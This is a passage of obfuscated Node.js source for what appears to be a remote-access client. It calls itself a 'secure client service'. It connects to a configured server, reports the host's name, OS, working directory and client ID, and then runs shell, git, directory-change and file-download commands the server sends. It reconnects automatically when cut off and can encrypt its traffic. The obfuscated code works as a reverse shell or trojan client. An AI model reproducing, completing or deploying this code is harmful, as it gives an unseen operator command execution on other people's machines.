_0x2d3d5d=require(_0x30798b(0x28a)),_0x13fa0a=require('https'),_0x2eab41=_0x408200['startsWith'](_0x30798b(0x22c))?_0x13fa0a:_0x2d3d5d,_0x267d12=_0x43c21a[_0x30798b(0x292)](_0x4dad1f);_0x353bc4[_0x30798b(0x13c)]('Starting\x20download\x20from\x20'+_0x408200+_0x30798b(0x17c)),_0x2eab41[_0x30798b(0x1d5)](_0x408200,_0xfe5c4=>{const _0x51dcde=_0x30798b;if(_0xfe5c4[_0x51dcde(0x287)]!==0xc8){_0x353bc4[_0x51dcde(0x13c)]('Error:\x20Failed\x20to\x20download.\x20Status\x20code:\x20'+_0xfe5c4[_0x51dcde(0x287)]+'\x0a');return;}_0xfe5c4[_0x51dcde(0x16a)](_0x267d12),_0x267d12['on'](_0x51dcde(0x17a),()=>{const _0x3efb12=_0x51dcde;_0x267d12[_0x3efb12(0x20c)](),_0x353bc4[_0x3efb12(0x13c)](_0x3efb12(0x202)+_0x4dad1f+'\x0a');});})['on'](_0x30798b(0x1c7),_0x37bae4=>{const _0x126368=_0x30798b;_0x43c21a[_0x126368(0x16d)](_0x4dad1f,()=>{}),_0x353bc4[_0x126368(0x13c)](_0x126368(0x174)+_0x37bae4[_0x126368(0x25a)]+'\x0a');});}catch(_0x292029){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x286)+_0x292029[_0x30798b(0x25a)]+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)](_0x30798b(0x1b8))){if(!config[_0x30798b(0x1b2)]['allowShellExecution'])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x190)),!![];const _0xdc1157=_0x46247e[_0x30798b(0x186)](0xb);try{const _0x431bc9=require('child_process'),_0x45f77a=_0x431bc9[_0x30798b(0x1d8)](_0x30798b(0x1ea)+_0xdc1157+'\x22',{'encoding':_0x30798b(0x16b)});_0x353bc4[_0x30798b(0x13c)](_0x45f77a+'\x0a');}catch(_0x1be7fd){_0x353bc4[_0x30798b(0x13c)](_0x30798b(0x1f6)+_0x1be7fd[_0x30798b(0x25a)]+'\x0a'+(_0x1be7fd[_0x30798b(0x24b)]||'')+'\x0a');}return!![];}if(_0x46247e[_0x30798b(0x19e)]('git\x20')||_0x46247e['startsWith'](_0x30798b(0x169))){if(!config['features'][_0x30798b(0x237)])return _0x353bc4[_0x30798b(0x13c)](_0x30798b(0x190)),!![];const _0x4397e3=_0x46247e['startsWith'](_0x30798b(0x169))?_0x30798b(0x205)+_0x46247e[_0x30798b(0x186)](0x4):_0x46247e;if(_0x4397e3['includes'](_0x30798b(0x231))&&!_0x4397e3[_0x30798b(0x1b5)]('--progress')){const _0x114928=_0x4397e3['split']('\x20'),_0x30e995=_0x114928[_0x30798b(0x163)](_0x30798b(0x231));_0x30e995!==-0x1&&(_0x114928[_0x30798b(0x192)](_0x30e995+0x1,0x0,_0x30798b(0x27d)),_0x46247e=_0x114928['join']('\x20'));}const _0x3802bc=os[_0x30798b(0x124)]()===_0x30798b(0x1e8)&&_0x4397e3['includes'](_0x30798b(0x231));return executeGitCommand(_0x4397e3,_0x3802bc)['then'](_0x16171f=>{const _0x1058a6=_0x30798b;_0x353bc4[_0x1058a6(0x13c)](_0x16171f+'\x0a');})['catch'](_0x52c35c=>{const _0x1bad8c=_0x30798b;_0x353bc4['write'](_0x1bad8c(0x286)+_0x52c35c['message']+'\x0a');}),!![];}return![];}function connectToServer(_0x573fd2,_0x5cfff1=0x0){const _0x2902e0=_0x469c78;logMessage('Attempting\x20to\x20connect\x20to\x20'+_0x573fd2+':'+config[_0x2902e0(0x243)]+_0x2902e0(0x150));const _0x517f5a=new net['Socket']();_0x517f5a['on']('connect',()=>{const _0x27ed59=_0x2902e0;logMessage(_0x27ed59(0x185)+_0x573fd2+':'+config['serverPort']),_0x5cfff1=0x0;const _0x1d227b=_0x27ed59(0x132)+os[_0x27ed59(0x123)]()+'\x20('+os['platform']()+'\x20'+os[_0x27ed59(0x15f)]()+_0x27ed59(0x13b)+process[_0x27ed59(0x194)]()+_0x27ed59(0x17d)+config[_0x27ed59(0x264)]['id'];_0x517f5a['write'](config[_0x27ed59(0x183)]?encryptData(_0x1d227b):_0x1d227b);}),_0x517f5a['on'](_0x2902e0(0x1fe),async _0x3b4ee9=>{const _0x62b3b8=_0x2902e0,_0x1c289e=config[_0x62b3b8(0x183)]?decryptData(_0x3b4ee9[_0x62b3b8(0x279)]()[_0x62b3b8(0x1d3)]()):_0x3b4ee9[_0x62b3b8(0x279)]()[_0x62b3b8(0x1d3)]();_0x1c289e!==_0x62b3b8(0x1f1)&&logMessage(_0x62b3b8(0x138)+_0x1c289e);const _0x2e2bed=await handleSpecialCommands(_0x1c289e,_0x517f5a);if(_0x2e2bed)return;if(_0x1c289e===_0x62b3b8(0x12c)){logMessage(_0x62b3b8(0x143)),_0x517f5a['end']();return;}if(_0x1c289e[_0x62b3b8(0x19e)](_0x62b3b8(0x1dc))){const _0x5de614=_0x1c289e['substring'](0x3);try{process[_0x62b3b8(0x1a0)](_0x5de614),_0x517f5a[_0x62b3b8(0x13c)]('Changed\x20directory\x20to:\x20'+process[_0x62b3b8(0x194)]()+'\x0a');}catch(_0x35a89c){_0x517f5a['write'](_0x62b3b8(0x15d)+_0x35a89c[_0x62b3b8(0x25a)]+'\x0a');}return;}try{const _0x22200f=await executeCommand(_0x1c289e);_0x517f5a['write'](config[_0x62b3b8(0x183)]?encryptData(_0x22200f):_0x22200f+'\x0a');}catch(_0x5706ee){_0x517f5a[_0x62b3b8(0x13c)](config[_0x62b3b8(0x183)]?encryptData('Error:\x20'+_0x5706ee[_0x62b3b8(0x25a)]):_0x62b3b8(0x286)+_0x5706ee[_0x62b3b8(0x25a)]+'\x0a');}}),_0x517f5a['on'](_0x2902e0(0x1c7),_0x4c6eb5=>{const _0x4298cf=_0x2902e0;logMessage(_0x4298cf(0x19d)+_0x4c6eb5[_0x4298cf(0x25a)]);}),_0x517f5a['on']('close',()=>{const _0x9b1c18=_0x2902e0;logMessage(_0x9b1c18(0x125));const _0x2484a9=config['reconnectDelay']*Math['min'](Math[_0x9b1c18(0x1de)](1.5,Math[_0x9b1c18(0x241)](_0x5cfff1,0xa)),0x5);setTimeout(()=>{resolveDomainAndConnect(_0x5cfff1+0x1);},_0x2484a9);}),_0x517f5a[_0x2902e0(0x262)](config[_0x2902e0(0x243)],_0x573fd2);}async function executeGitCommand(_0x566855,_0x277845=![]){return new Promise(_0xff513f=>{const _0x50c32b=_0x29d5;try{const _0x50fefa=require(_0x50c32b(0x18a));try{_0x50fefa[_0x50c32b(0x1d8)](_0x50c32b(0x1a4),{'stdio':'ignore'});}catch(_0x11e025){return _0xff513f('Git\x20is\x20not\x20installed\x20or\x20not\x20available\x20in\x20PATH.\x20Please\x20install\x20Git\x20and\x20try\x20again.');}let _0x35974b='cmd.exe',_0x36a4c7=['/c'];os[_0x50c32b(0x124)]()===_0x50c32b(0x1e8)&&_0x277845&&(_0x35974b=_0x50c32b(0x277),_0x36a4c7=[_0x50c32b(0x1ce)]);const _0x379cf9=_0x50fefa[_0x50c32b(0x1b1)](_0x35974b,[..._0x36a4c7,_0x566855],{'shell':!![]});let _0x2e3ee2='',_0x41293c='';_0x379cf9[_0x50c32b(0x207)]['on'](_0x50c32b(0x1fe),_0x4b4c68=>{const _0xb9ff56=_0x50c32b;_0x2e3ee2+=_0x4b4c68[_0xb9ff56(0x279)]();}),_0x379cf9['stderr']['on'](_0x50c32b(0x1fe),_0x459163=>{const _0x511aed=_0x50c32b;_0x41293c+=_0x459163[_0x511aed(0x279)]();}),_0x379cf9['on'](_0x50c32b(0x20c),_0x110240=>{const _0x583e97=_0x50c32b;if(_0x110240!==0x0){_0xff513f(_0x583e97(0x181)+_0x110240+_0x583e97(0x289)+_0x41293c);return;}_0xff513f(_0x2e3ee2||_0x583e97(0x129));});}catch(_0x5d65d5){_0xff513f('Error\x20executing\x20Git\x20command:\x20'+_0x5d65d5[_0x50c32b(0x25a)]);}});}function formatFileSize(_0x2e7e1d){const _0x28a1c4=_0x469c78;if(_0x2e7e1d===0x0)return _0x28a1c4(0x214);const _0x41cd86=0x400,_0x772747=[_0x28a1c4(0x155),'KB','MB','GB','TB'],_0x39864e=Math[_0x28a1c4(0x246)](Math[_0x28a1c4(0x195)](_0x2e7e1d)/Math[_0x28a1c4(0x195)](_0x41cd86));return parseFloat((_0x2e7e1d/Math[_0x28a1c4(0x1de)](_0x41cd86,_0x39864e))['toFixed'](0x2))+'\x20'+_0x772747[_0x39864e];}function getCpuUsage(){const _0x47ee68=_0x469c78;try{const _0x15a26c=os[_0x47ee68(0x167)]();let _0x4b119=0x0,_0x5144e2=0x0;_0x15a26c[_0x47ee68(0x21b)](_0x3d4a27=>{const _0x546356=_0x47ee68;for(const _0x3b1b3c in _0x3d4a27[_0x546356(0x173)]){_0x5144e2+=_0x3d4a27[_0x546356(0x173)][_0x3b1b3c];}_0x4b119+=_0x3d4a27['times'][_0x546356(0x1e1)];});const _0x442cde=0x64-Math[_0x47ee68(0x14f)](0x64*_0x4b119/_0x5144e2);return{'usage':_0x442cde,'cores':_0x15a26c[_0x47ee68(0x11f)],'model':_0x15a26c[0x0][_0x47ee68(0x122)]};}catch(_0x5635a8){return{'usage':0x0,'cores':0x0,'model':_0x47ee68(0x127)};}}function getNetworkStats(){const _0x21ed90=_0x469c78;try{const _0x30580c=os['networkInterfaces'](),_0x4f5515=[];return Object[_0x21ed90(0x133)](_0x30580c)[_0x21ed90(0x21b)](_0x16043d=>{_0x30580c[_0x16043d]['forEach'](_0x2ee16e=>{const _0x4fcb51=_0x29d5;!_0x2ee16e[_0x4fcb51(0x191)]&&_0x2ee16e['family']===_0x4fcb51(0x17f)&&_0x4f5515['push']({'name':_0x16043d,'address':_0x2ee16e[_0x4fcb51(0x153)],'netmask':_0x2ee16e[_0x4fcb51(0x230)],'mac':_0x2ee16e['mac']});});}),_0x4f5515;}catch(_0x8bfaf5){return[];}}function getDiskStats(){const _0x358659=_0x469c78;try{return{'available':_0x358659(0x203),'used':'N/A','total':'N/A'};}catch(_0x280945){return{'available':_0x358659(0x203),'used':_0x358659(0x203),'total':_0x358659(0x203)};}}function getTopProcesses(_0x4d169b=0x5){const _0x366427=_0x469c78;try{return[{'name':_0x366427(0x251),'pid':0x0,'cpu':0x0,'memory':0x0}];}catch(_0x14561d){return[];}}function start(){const _0x16aaaf=_0x469c78;logMessage('Starting\x20secure\x20client\x20service...'),console[_0x16aaaf(0x195)](_0x16aaaf(0x1d1)+config[_0x16aaaf(0x211)]+':'+config[_0x16aaaf(0x243)]),console[_0x16aaaf(0x195)](_0x16aaaf(0x28c)+config[_0x16aaaf(0x264)]['id']),console[_0x16aaaf(0x195)](_0x16aaaf(0x1cc)+config[_0x16aaaf(0x264)][_0x16aaaf(0x124)]+'\x20('+config[_0x16aaaf(0x264)][_0x16aaaf(0x149)]+')'),console[_0x16aaaf(0x195)](_0x16aaaf(0x164)+(config[_0x16aaaf(0x183)]?_0x16aaaf(0x160):'Disabled')),console[_0x16aaaf(0x195)](_0x16aaaf(0x278)+Object[_0x16aaaf(0x1cd)](config[_0x16aaaf(0x1b2)])[_0x16aaaf(0x21a)](([_0x1712dc,_0x467ce9])=>_0x467ce9)[_0x16aaaf(0x18c)](([_0x520c35])=>_0x520c35)[_0x16aaaf(0x1bb)](',\x20')),console[_0x16aaaf(0x195)]('[*]\x20Log\x20file:\x20'+(config[_0x16aaaf(0x227)]?config[_0x16aaaf(0x1e6)]:_0x16aaaf(0x288))),setTimeout(()=>{resolveDomainAndConnect();},0x3e8);}require['main']===module&&start();module[_0x469c78(0x208)]={'start':start,'config':config};